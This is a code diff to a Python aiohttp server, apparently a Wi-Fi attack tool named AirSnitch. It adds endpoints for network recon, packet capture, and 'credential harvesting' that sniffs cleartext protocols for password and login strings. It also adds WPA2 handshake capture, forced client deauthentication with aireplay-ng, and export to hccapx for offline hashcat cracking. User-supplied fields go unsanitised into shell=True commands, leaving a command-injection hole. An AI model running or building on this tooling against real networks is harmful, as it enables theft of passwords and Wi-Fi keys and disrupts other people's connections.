@@ -20,6 +20,8 @@ import signal
 import struct
 import subprocess
 import sys
+import threading
+import time
 
 from aiohttp import web
 import aiohttp
@@ -51,6 +53,21 @@ _active_wpa_mode: dict[str, str] = {}  # iface -> "standard" | "airsnitch"
 # GTK check job state (fire-and-poll pattern avoids long-lived HTTP connections)
 _gtk_job: dict = {"status": "idle"}   # idle | running | done
 _gtk_task: asyncio.Task | None = None
+
+# PCAP capture state
+_pcap_proc: subprocess.Popen | None = None
+_pcap_file: str = "/tmp/airsnitch_capture.pcap"
+_pcap_start_time: float = 0.0
+
+# Credential harvesting state
+_cred_proc: subprocess.Popen | None = None
+_cred_lines: list[str] = []
+
+# WPA2 handshake capture state
+_hs_job: dict = {"status": "idle"}   # idle | running | captured | done | error
+_hs_proc: subprocess.Popen | None = None
+_hs_pcap_prefix: str = "/tmp/airsnitch_hs"
+_hs_hccapx: str = "/tmp/airsnitch_hs.hccapx"
 
 # ── Helpers ──────────────────────────────────────────────────────────────────
 
@@ -1858,6 +1875,356 @@ async def api_mitm_stop(request):
     })
 
 
+# ── REST API: Recon ──────────────────────────────────────────────────────────
+
+async def api_recon_scan_aps(request):
+    """Scan for nearby APs using iw. Returns list of {ssid,bssid,channel,signal,security}."""
+    body = await request.json()
+    iface = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+
+    rc, out = await async_run(f"iw dev {iface} scan 2>&1", timeout=30)
+    aps = []
+    current: dict = {}
+    for line in out.splitlines():
+        line = line.strip()
+        if line.startswith("BSS "):
+            if current.get("bssid"):
+                aps.append(current)
+            bssid = line.split()[1].split("(")[0].strip()
+            current = {"bssid": bssid, "ssid": "", "channel": 0, "signal": -100, "security": "Open"}
+        elif line.startswith("SSID:"):
+            current["ssid"] = line[5:].strip()
+        elif line.startswith("signal:"):
+            try:
+                current["signal"] = float(line.split()[1])
+            except (ValueError, IndexError):
+                pass
+        elif line.startswith("DS Parameter set: channel"):
+            try:
+                current["channel"] = int(line.split()[-1])
+            except (ValueError, IndexError):
+                pass
+        elif line.startswith("* primary channel:"):
+            try:
+                current["channel"] = int(line.split()[-1])
+            except (ValueError, IndexError):
+                pass
+        elif line.startswith("RSN:"):
+            current["security"] = "WPA2"
+        elif line.startswith("WPA:") and current.get("security") != "WPA2":
+            current["security"] = "WPA"
+        elif "Privacy" in line and current.get("security") == "Open":
+            current["security"] = "WEP"
+    if current.get("bssid"):
+        aps.append(current)
+
+    aps.sort(key=lambda x: x["signal"], reverse=True)
+    return web.json_response({"aps": aps, "count": len(aps), "iface": iface, "output": out})
+
+
+async def api_recon_clients(request):
+    """Discover active clients on the connected network using arp-scan or nmap."""
+    body = await request.json()
+    iface = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+
+    # Try arp-scan first (faster, more reliable on Wi-Fi)
+    rc, out = await async_run(f"arp-scan -I {iface} --localnet 2>&1", timeout=30)
+    clients = []
+    if rc == 0 and "Interface:" in out:
+        for line in out.splitlines():
+            parts = line.split("\t")
+            if len(parts) >= 2:
+                ip = parts[0].strip()
+                mac = parts[1].strip()
+                vendor = parts[2].strip() if len(parts) >= 3 else ""
+                # Validate IP-looking field
+                if ip.count(".") == 3 and not ip.startswith("Interface"):
+                    clients.append({"ip": ip, "mac": mac, "vendor": vendor})
+    else:
+        # Fallback: nmap ARP ping
+        rc2, out2 = await async_run(
+            f"nmap -sn -PR --open -oG - {iface and f'-e {iface}'} 192.168.0.0/24 2>&1",
+            timeout=30
+        )
+        out = out2
+        for line in out2.splitlines():
+            if line.startswith("Host:"):
+                parts = line.split()
+                ip = parts[1] if len(parts) > 1 else ""
+                clients.append({"ip": ip, "mac": "", "vendor": ""})
+
+    return web.json_response({"clients": clients, "count": len(clients), "iface": iface, "output": out})
+
+
+# ── REST API: Capture ─────────────────────────────────────────────────────────
+
+async def api_capture_pcap_start(request):
+    """Start a tcpdump packet capture to a .pcap file."""
+    global _pcap_proc, _pcap_start_time
+    body = await request.json()
+    iface = body.get("iface", "wlan0").strip()
+    pkt_filter = body.get("filter", "").strip()
+
+    # Kill any running capture
+    if _pcap_proc and _pcap_proc.poll() is None:
+        _pcap_proc.terminate()
+        try:
+            _pcap_proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            _pcap_proc.kill()
+
+    filter_part = f" '{pkt_filter}'" if pkt_filter else ""
+    cmd = f"tcpdump -i {iface} -w {_pcap_file}{filter_part} 2>&1"
+    _pcap_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT, text=True)
+    _pcap_start_time = time.time()
+    append_log(f"[pcap-start] tcpdump started on {iface}")
+    return web.json_response({"started": True, "file": _pcap_file, "iface": iface})
+
+
+async def api_capture_pcap_stop(request):
+    """Stop the running tcpdump capture."""
+    global _pcap_proc
+    if not _pcap_proc or _pcap_proc.poll() is not None:
+        return web.json_response({"stopped": False, "error": "No capture running"})
+
+    _pcap_proc.terminate()
+    try:
+        _pcap_proc.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        _pcap_proc.kill()
+
+    duration = int(time.time() - _pcap_start_time)
+    size_bytes = os.path.getsize(_pcap_file) if os.path.exists(_pcap_file) else 0
+    append_log(f"[pcap-stop] Capture stopped. Size: {size_bytes} bytes, Duration: {duration}s")
+    return web.json_response({"stopped": True, "size_bytes": size_bytes, "duration_s": duration})
+
+
+async def api_capture_pcap_download(request):
+    """Download the captured .pcap file."""
+    if not os.path.exists(_pcap_file) or os.path.getsize(_pcap_file) == 0:
+        return web.json_response({"error": "No capture file available"}, status=404)
+    return web.FileResponse(
+        _pcap_file,
+        headers={"Content-Disposition": "attachment; filename=airsnitch_capture.pcap"}
+    )
+
+
+def _cred_reader_thread():
+    """Background thread: read tcpdump output, buffer lines matching credential patterns."""
+    global _cred_proc, _cred_lines
+    CRED_PATTERNS = (b"pass", b"user", b"login", b"authori", b"password", b"pwd",
+                     b"username", b"credential", b"secret")
+    if not _cred_proc:
+        return
+    try:
+        for raw in iter(_cred_proc.stdout.readline, b""):
+            line = raw.decode("utf-8", errors="replace").rstrip()
+            lower = line.lower().encode()
+            if any(p in lower for p in CRED_PATTERNS):
+                _cred_lines.append(line)
+                if len(_cred_lines) > 500:
+                    _cred_lines = _cred_lines[-500:]
+    except Exception:
+        pass
+
+
+async def api_capture_cred_start(request):
+    """Start credential harvesting — sniff cleartext ports for credential strings."""
+    global _cred_proc, _cred_lines
+    body = await request.json()
+    iface = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+
+    if _cred_proc and _cred_proc.poll() is None:
+        _cred_proc.terminate()
+        try:
+            _cred_proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            _cred_proc.kill()
+
+    _cred_lines = []
+    ports = "port 80 or port 21 or port 23 or port 25 or port 110 or port 143 or port 8080"
+    cmd = f"tcpdump -i {iface} -A -n -l '({ports})' 2>/dev/null"
+    _cred_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT)
+    t = threading.Thread(target=_cred_reader_thread, daemon=True)
+    t.start()
+    append_log(f"[cred-start] Credential harvesting started on {iface}")
+    return web.json_response({"started": True, "iface": iface})
+
+
+async def api_capture_cred_poll(request):
+    """Poll for captured credential lines."""
+    running = bool(_cred_proc and _cred_proc.poll() is None)
+    return web.json_response({"lines": _cred_lines[-100:], "count": len(_cred_lines), "running": running})
+
+
+async def api_capture_cred_stop(request):
+    """Stop credential harvesting."""
+    global _cred_proc
+    if not _cred_proc or _cred_proc.poll() is not None:
+        return web.json_response({"stopped": False, "lines": _cred_lines, "count": len(_cred_lines)})
+    _cred_proc.terminate()
+    try:
+        _cred_proc.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        _cred_proc.kill()
+    append_log(f"[cred-stop] Harvesting stopped. {len(_cred_lines)} lines captured.")
+    return web.json_response({"stopped": True, "lines": _cred_lines, "count": len(_cred_lines)})
+
+
+async def api_capture_hs_start(request):
+    """Put interface into monitor mode and start airodump-ng to capture WPA2 handshake."""
+    global _hs_proc, _hs_job
+    body = await request.json()
+    iface = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+    bssid = body.get("bssid", "").strip()
+    channel = str(body.get("channel", "1")).strip()
+
+    if not bssid:
+        return web.json_response({"error": "bssid required"}, status=400)
+
+    # Kill any existing handshake capture
+    if _hs_proc and _hs_proc.poll() is None:
+        _hs_proc.terminate()
+        try:
+            _hs_proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            _hs_proc.kill()
+
+    # Clean up old cap files
+    run(f"rm -f {_hs_pcap_prefix}-*.cap {_hs_pcap_prefix}-*.csv {_hs_pcap_prefix}-*.kismet.csv {_hs_pcap_prefix}-*.kismet.netxml 2>/dev/null")
+
+    # Put interface into monitor mode on correct channel
+    rc1, out1 = await async_run(f"airmon-ng start {iface} {channel} 2>&1", timeout=20)
+    mon_iface = f"{iface}mon"
+
+    # Start airodump-ng
+    cmd = (f"airodump-ng --bssid {bssid} -c {channel} "
+           f"-w {_hs_pcap_prefix} --output-format pcap {mon_iface} 2>&1")
+    _hs_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                 stderr=subprocess.STDOUT, text=True)
+    _hs_job = {"status": "running", "bssid": bssid, "channel": channel, "iface": iface,
+               "mon_iface": mon_iface, "handshake_found": False}
+    append_log(f"[hs-start] airodump-ng started on {mon_iface} for BSSID {bssid} ch{channel}")
+    return web.json_response({"started": True, "mon_iface": mon_iface})
+
+
+async def api_capture_hs_deauth(request):
+    """Send deauthentication frames to force a client reconnect (and handshake)."""
+    body = await request.json()
+    iface = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+    bssid = body.get("bssid", _hs_job.get("bssid", "")).strip()
+    mon_iface = f"{iface}mon"
+
+    if not bssid:
+        return web.json_response({"error": "bssid required"}, status=400)
+
+    rc, out = await async_run(f"aireplay-ng --deauth 5 -a {bssid} {mon_iface} 2>&1", timeout=20)
+    append_log(f"[hs-deauth] Sent 5 deauth frames to {bssid} via {mon_iface}")
+    return web.json_response({"sent": True, "output": out})
+
+
+async def api_capture_hs_poll(request):
+    """Check if a WPA handshake has been captured by looking at airodump-ng cap file."""
+    global _hs_job
+    running = bool(_hs_proc and _hs_proc.poll() is None)
+
+    # Check the airodump-ng CSV for WPA handshake marker
+    cap_file = f"{_hs_pcap_prefix}-01.cap"
+    csv_file = f"{_hs_pcap_prefix}-01.csv"
+    handshake_found = _hs_job.get("handshake_found", False)
+
+    if not handshake_found and os.path.exists(csv_file):
+        rc, csv_out = run(f"cat {csv_file} 2>/dev/null", timeout=3)
+        if "WPA handshake" in csv_out or "handshake" in csv_out.lower():
+            handshake_found = True
+            _hs_job["handshake_found"] = True
+            _hs_job["status"] = "captured"
+
+    # Also try tshark EAPOL check on cap file if it exists
+    if not handshake_found and os.path.exists(cap_file):
+        rc2, eapol_out = run(
+            f"tshark -r {cap_file} -Y 'eapol' -T fields -e frame.number 2>/dev/null | wc -l",
+            timeout=5
+        )
+        try:
+            eapol_count = int(eapol_out.strip())
+            if eapol_count >= 2:
+                handshake_found = True
+                _hs_job["handshake_found"] = True
+                _hs_job["status"] = "captured"
+        except ValueError:
+            pass
+
+    return web.json_response({
+        "status": _hs_job.get("status", "idle"),
+        "running": running,
+        "handshake_found": handshake_found,
+    })
+
+
+async def api_capture_hs_stop(request):
+    """Stop airodump-ng, restore interface, convert .cap to .hccapx with hcxpcapngtool."""
+    global _hs_proc, _hs_job
+    if _hs_proc and _hs_proc.poll() is None:
+        _hs_proc.terminate()
+        try:
+            _hs_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            _hs_proc.kill()
+
+    # Restore interface to managed mode
+    iface = _hs_job.get("iface", "wlan0")
+    mon_iface = _hs_job.get("mon_iface", f"{iface}mon")
+    rc_stop, out_stop = await async_run(f"airmon-ng stop {mon_iface} 2>&1", timeout=15)
+
+    # Convert cap to hccapx
+    cap_file = f"{_hs_pcap_prefix}-01.cap"
+    hccapx_size = 0
+    convert_out = ""
+    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
+        rc_conv, convert_out = await async_run(
+            f"hcxpcapngtool -o {_hs_hccapx} {cap_file} 2>&1", timeout=30
+        )
+        if os.path.exists(_hs_hccapx):
+            hccapx_size = os.path.getsize(_hs_hccapx)
+            _hs_job["status"] = "done"
+        else:
+            _hs_job["status"] = "error"
+    else:
+        _hs_job["status"] = "error"
+        convert_out = "No .cap file found or file is empty"
+
+    append_log(f"[hs-stop] Stopped. hccapx size: {hccapx_size} bytes. {convert_out[:200]}")
+    return web.json_response({
+        "status": _hs_job["status"],
+        "hccapx_size": hccapx_size,
+        "output": convert_out,
+        "restore_output": out_stop,
+    })
+
+
+async def api_capture_hs_download(request):
+    """Download the converted .hccapx file for offline hashcat cracking."""
+    if not os.path.exists(_hs_hccapx) or os.path.getsize(_hs_hccapx) == 0:
+        return web.json_response({"error": "No hccapx file available"}, status=404)
+    return web.FileResponse(
+        _hs_hccapx,
+        headers={"Content-Disposition": "attachment; filename=airsnitch_hs.hccapx"}
+    )
+
+
 # ── REST API: Configuration ──────────────────────────────────────────────────
 
 async def api_config_load(request):
@@ -2091,6 +2458,23 @@ def create_app():
     # AirSnitch GTK Check (single NIC — calls airsnitch-run)
     app.router.add_post("/api/airsnitch/gtk-check", api_gtk_check)
     app.router.add_get("/api/airsnitch/gtk-poll", api_gtk_poll)
+
+    # Recon
+    app.router.add_post("/api/recon/scan-aps", api_recon_scan_aps)
+    app.router.add_post("/api/recon/clients", api_recon_clients)
+
+    # Capture
+    app.router.add_post("/api/capture/pcap-start", api_capture_pcap_start)
+    app.router.add_post("/api/capture/pcap-stop", api_capture_pcap_stop)
+    app.router.add_get("/api/capture/pcap-download", api_capture_pcap_download)
+    app.router.add_post("/api/capture/cred-start", api_capture_cred_start)
+    app.router.add_get("/api/capture/cred-poll", api_capture_cred_poll)
+    app.router.add_post("/api/capture/cred-stop", api_capture_cred_stop)
+    app.router.add_post("/api/capture/handshake-start", api_capture_hs_start)
+    app.router.add_post("/api/capture/handshake-deauth", api_capture_hs_deauth)
+    app.router.add_get("/api/capture/handshake-poll", api_capture_hs_poll)
+    app.router.add_post("/api/capture/handshake-stop", api_capture_hs_stop)
+    app.router.add_get("/api/capture/handshake-download", api_capture_hs_download)
 
     # Config
     app.router.add_get("/api/config/load", api_config_load)
